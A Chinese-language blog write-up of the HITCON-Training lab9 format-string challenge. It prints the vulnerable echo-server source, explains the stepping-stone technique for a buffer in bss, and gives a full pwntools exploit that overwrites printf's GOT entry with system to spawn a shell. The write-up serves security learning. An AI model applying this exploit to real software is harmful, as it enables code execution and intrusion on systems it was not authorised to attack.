@@ -1,0 +1,227 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>【WP】HITCON-Training-lab9 | aYoung's Blog</title><meta name="keywords" content="ctf,wp,pwn'"><meta name="author" content="aYoung"><meta name="copyright" content="aYoung"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="题目描述源码123456789101112131415161718192021222324252627282930#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;char buf[200] ;void do_fmt()&amp;#123;	while(1)&amp;#123;		read(0,buf,200);">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【WP】HITCON-Training-lab9">
+<meta property="og:url" content="https://iamayoung.xyz/2021/03/10/%E3%80%90WP%E3%80%91HITCON-Training-lab9/index.html">
+<meta property="og:site_name" content="aYoung&#39;s Blog">
+<meta property="og:description" content="题目描述源码123456789101112131415161718192021222324252627282930#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;char buf[200] ;void do_fmt()&amp;#123;	while(1)&amp;#123;		read(0,buf,200);">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ftp.bmp.ovh/imgs/2021/02/ec5ef65c96792f29.png">
+<meta property="article:published_time" content="2021-03-10T12:09:06.000Z">
+<meta property="article:modified_time" content="2021-03-16T15:31:38.785Z">
+<meta property="article:author" content="aYoung">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="wp">
+<meta property="article:tag" content="pwn&#39;">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ftp.bmp.ovh/imgs/2021/02/ec5ef65c96792f29.png"><link rel="shortcut icon" href="/"><link rel="canonical" href="https://iamayoung.xyz/2021/03/10/%E3%80%90WP%E3%80%91HITCON-Training-lab9/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-03-16 23:31:38'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    })(window)</script><meta name="generator" content="Hexo 5.2.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="https://ftp.bmp.ovh/imgs/2020/12/e087cb4981dcab3d.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">35</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://ftp.bmp.ovh/imgs/2021/02/ec5ef65c96792f29.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">aYoung's Blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">【WP】HITCON-Training-lab9</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-03-10T12:09:06.000Z" title="发表于 2021-03-10 20:09:06">2021-03-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-03-16T15:31:38.785Z" title="更新于 2021-03-16 23:31:38">2021-03-16</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf/">ctf</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>4分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">200</span>] ;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_fmt</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		read(<span class="number">0</span>,buf,<span class="number">200</span>);</span><br><span class="line">		<span class="keyword">if</span>(!<span class="built_in">strncmp</span>(buf,<span class="string">&quot;quit&quot;</span>,<span class="number">4</span>))</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="built_in">printf</span>(buf);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">play</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;=====================&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;  Magic echo Server&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;=====================&quot;</span>);</span><br><span class="line">	do_fmt();</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">	play();</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="关键函数"><a href="#关键函数" class="headerlink" title="关键函数"></a>关键函数</h2><p>循环执行的格式化字符串漏洞<br><img src = 'https://i.bmp.ovh/imgs/2021/03/c0af4cea2ae67bdd.png' /></p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><ol>
+<li>想要getshell，我们希望执行system函数，恰好这里printf函数以输入的内容作为参数且存在格式化字符串漏洞，于是可以考虑把printf的got内容修改为system函数的地址，再输入<code>/bin/sh</code>就能getshell了（或者用onegadget）</li>
+<li>要想把printf的got表写入system函数地址，我们需要得到printf的真实地址，减去printf的偏移加上system的偏移就能得到system函数地址（本题没有system函数）。所以考虑通过%x$s的方式泄露printf的got表内容（x对应第几个参数指向printf的got地址）</li>
+<li>既然如此我们就得想办法让栈上的地址指向printf的got表地址。这里就是本题的<strong>重中之重</strong>了，假如buf位于<strong>栈上</strong>，我们只需要写入printf的got表地址然后指向该地址用%s打印，就能泄露出printf的got表内容。但是本题buf是全局变量，位于<strong>bss段</strong>，就要用到另一种利用姿势了，记为<strong>fmt_bss</strong></li>
+</ol>
+<h2 id="fmt-bss"><a href="#fmt-bss" class="headerlink" title="fmt_bss"></a>fmt_bss</h2><p>非栈上的格式化字符串漏洞，需要找“跳板”。原因：对于<code>%ac%xn</code>，a是个数，x是偏移。如果相应地址处存放的仍然是一个地址（指针），则会向这里存放的指针指向的地址处写入数。如a-&gt;b-&gt;c，则向c写入数据<br>通常来说是通过利用ebp和返回地址进行操作</p>
+<p>本题而言的具体操作如下：</p>
+<ol>
+<li>获得ebp2的地址</li>
+<li>先让ebp2指向ebp1下的第一个返回地址处，记为fmt7</li>
+<li>用printf的got表地址的低位两个字节覆盖fmt7低位两个字节，此时fmt7-&gt;printf_got（返回地址的前两个字节与got表相同）</li>
+<li>再让ebp2指向ebp2下的第二个返回地址处，记为fmt11</li>
+<li>用printf的got表地址+2的低位两个字节覆盖fmt11低位两个字节，此时fmt11-&gt;printf_got+2</li>
+<li>获取printf的got表内容，并计算得到system真实地址</li>
+<li>通过fmt7-&gt;printf_got，把system地址低位两个字节写入printf的got表处</li>
+<li>通过fmt11-&gt;printf_got+2，把system地址高位两个字节写入printf的got表处</li>
+<li>写入<code>/bin/sh</code>，拿到shell</li>
+</ol>
+<h1 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h1><ul>
+<li>利用hn写入两字节的方式会接收很多字符，用recv()接收字符时一次最多接收0x1000字节内容，单次接受不完，所以发送标志字符并查看是否存在于接收字符中，来验证是否接受完</li>
+</ul>
+<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><p>打本地的，buu没复现成功。。什么时候打通了就把远程脚本放上来</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;./playfmt&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./playfmt&#x27;</span>)</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;*************leak printf_got**************&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;%6$x&quot;</span> <span class="comment">#ebp1-&gt;ebp2</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">ebp2 = <span class="built_in">int</span>(r.recv(),<span class="number">16</span>)</span><br><span class="line">ebp1 = ebp2 - <span class="number">0x10</span></span><br><span class="line">fmt7 = ebp1 + <span class="number">0x4</span></span><br><span class="line">fmt11 = ebp2 + <span class="number">0x4</span></span><br><span class="line">log.info(<span class="string">&quot;printf_got ==&gt; [%s]&quot;</span>%<span class="built_in">hex</span>(printf_got))</span><br><span class="line">log.info(<span class="string">&quot;ebp2_addr  ==&gt; [%s]&quot;</span>%<span class="built_in">hex</span>(ebp2))</span><br><span class="line">log.info(<span class="string">&quot;fmt7_addr  ==&gt; [%s]&quot;</span>%<span class="built_in">hex</span>(fmt7))</span><br><span class="line">log.info(<span class="string">&quot;fmt11_addr ==&gt; [%s]&quot;</span>%<span class="built_in">hex</span>(fmt11))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(fmt7&amp;<span class="number">0xffff</span>) + <span class="string">&#x27;c%6$hn&#x27;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(printf_got&amp;<span class="number">0xffff</span>) + <span class="string">&#x27;c%10$hn\x00&#x27;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	r.send(<span class="string">&quot;ayoung\x00&quot;</span>)</span><br><span class="line">	sleep(<span class="number">0.2</span>)</span><br><span class="line">	data = r.recv()</span><br><span class="line">	<span class="keyword">if</span> data.find(<span class="string">&quot;ayoung&quot;</span>)!= -<span class="number">1</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(fmt11&amp;<span class="number">0xffff</span>) + <span class="string">&#x27;c%6$hn\x00&#x27;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((printf_got+<span class="number">2</span>)&amp;<span class="number">0xffff</span>) + <span class="string">&#x27;c%10$hn&#x27;</span></span><br><span class="line">r.send(payload)</span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	r.send(<span class="string">&quot;ayoung\x00&quot;</span>)</span><br><span class="line">	sleep(<span class="number">0.2</span>)</span><br><span class="line">	data = r.recv()</span><br><span class="line">	<span class="keyword">if</span> data.find(<span class="string">&quot;ayoung&quot;</span>)!= -<span class="number">1</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;aaaa%7$s\x00&#x27;</span></span><br><span class="line">r.send(payload)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">printf_add = u32(r.recv(<span class="number">4</span>))</span><br><span class="line">log.info(<span class="string">&quot;printf_add ==&gt; [%s]&quot;</span>%<span class="built_in">hex</span>(printf_add))</span><br><span class="line">system_add = printf_add - <span class="number">0xe8d0</span></span><br><span class="line">log.info(<span class="string">&quot;system_add ==&gt; [%s]&quot;</span>%<span class="built_in">hex</span>(system_add))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(system_add&amp;<span class="number">0xffff</span>) + <span class="string">&#x27;c%7$hn&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((system_add&gt;&gt;<span class="number">16</span>)-(system_add&amp;<span class="number">0xffff</span>)) + <span class="string">&#x27;c%11$hn\x00&#x27;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	r.send(<span class="string">&quot;ayoung\x00&quot;</span>)</span><br><span class="line">	sleep(<span class="number">0.2</span>)</span><br><span class="line">	data = r.recv()</span><br><span class="line">	<span class="keyword">if</span> data.find(<span class="string">&quot;ayoung&quot;</span>)!= -<span class="number">1</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">r.send(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<img src = 'https://ftp.bmp.ovh/imgs/2021/03/85aa7c607fcc3880.png' />
+
+
+<h1 id="学到"><a href="#学到" class="headerlink" title="学到"></a>学到</h1><ol>
+<li>fmt_bss</li>
+<li>gdb一步一步调试理解过程</li>
+<li>位运算提取相应字节</li>
+<li>加入标志字符确定字符接收情况</li>
+</ol>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">aYoung</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://iamayoung.xyz/2021/03/10/%E3%80%90WP%E3%80%91HITCON-Training-lab9/">https://iamayoung.xyz/2021/03/10/%E3%80%90WP%E3%80%91HITCON-Training-lab9/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://iamayoung.xyz" target="_blank">aYoung's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ctf/">ctf</a><a class="post-meta__tags" href="/tags/wp/">wp</a><a class="post-meta__tags" href="/tags/pwn/">pwn'</a></div><div class="post_share"><div class="social-share" data-image="https://ftp.bmp.ovh/imgs/2021/02/ec5ef65c96792f29.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/03/16/Stack-smash/"><img class="prev-cover" src="https://ftp.bmp.ovh/imgs/2021/03/efa0723f1559e567.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Stack-smash</div></div></a></div><div class="next-post pull-right"><a href="/2021/03/07/%E3%80%90WP%E3%80%91HITCON-Training-lab8/"><img class="next-cover" src="https://ftp.bmp.ovh/imgs/2021/02/ec5ef65c96792f29.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">【WP】HITCON-Training-lab8</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/03/31/【WP】HITCON-Training-lab10/" title="【WP】HITCON-Training-lab10"><img class="cover" src="https://ftp.bmp.ovh/imgs/2021/02/ec5ef65c96792f29.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-03-31</div><div class="title">【WP】HITCON-Training-lab10</div></div></a></div><div><a href="/2021/03/07/【WP】HITCON-Training-lab8/" title="【WP】HITCON-Training-lab8"><img class="cover" src="https://ftp.bmp.ovh/imgs/2021/02/ec5ef65c96792f29.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-03-07</div><div class="title">【WP】HITCON-Training-lab8</div></div></a></div><div><a href="/2021/05/13/【WP】CSTC2021-Pwn/" title="【WP】CSTC2021-Pwn"><img class="cover" src="https://ftp.bmp.ovh/imgs/2021/02/ec5ef65c96792f29.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-05-13</div><div class="title">【WP】CSTC2021-Pwn</div></div></a></div><div><a href="/2021/04/14/【WP】hitcon2014-stkof/" title="【WP】hitcon2014_stkof"><img class="cover" src="https://ftp.bmp.ovh/imgs/2021/02/ec5ef65c96792f29.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-04-14</div><div class="title">【WP】hitcon2014_stkof</div></div></a></div><div><a href="/2021/05/13/【WP】津门杯2021-easypwn/" title="【WP】津门杯2021-easypwn"><img class="cover" src="https://ftp.bmp.ovh/imgs/2021/02/ec5ef65c96792f29.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-05-13</div><div class="title">【WP】津门杯2021-easypwn</div></div></a></div><div><a href="/2021/03/31/【WP】babyheap-0ctf-2017/" title="【WP】babyheap_0ctf_2017"><img class="cover" src="https://ftp.bmp.ovh/imgs/2021/02/ec5ef65c96792f29.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-03-31</div><div class="title">【WP】babyheap_0ctf_2017</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="https://ftp.bmp.ovh/imgs/2020/12/e087cb4981dcab3d.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">aYoung</div><div class="author-info__description">aYoung的博客</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">35</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/aYoung-CS"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/aYoung-CS" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">好好学习</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">题目描述</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E7%A0%81"><span class="toc-number">1.1.</span> <span class="toc-text">源码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.</span> <span class="toc-text">关键函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">1.3.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fmt-bss"><span class="toc-number">1.4.</span> <span class="toc-text">fmt_bss</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%86%E8%8A%82"><span class="toc-number">2.</span> <span class="toc-text">细节</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#exp"><span class="toc-number">3.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AD%A6%E5%88%B0"><span class="toc-number">4.</span> <span class="toc-text">学到</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/05/13/%E3%80%90WP%E3%80%91%E6%B4%A5%E9%97%A8%E6%9D%AF2021-easypwn/" title="【WP】津门杯2021-easypwn"><img src="https://ftp.bmp.ovh/imgs/2021/02/ec5ef65c96792f29.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【WP】津门杯2021-easypwn"/></a><div class="content"><a class="title" href="/2021/05/13/%E3%80%90WP%E3%80%91%E6%B4%A5%E9%97%A8%E6%9D%AF2021-easypwn/" title="【WP】津门杯2021-easypwn">【WP】津门杯2021-easypwn</a><time datetime="2021-05-13T13:17:46.000Z" title="发表于 2021-05-13 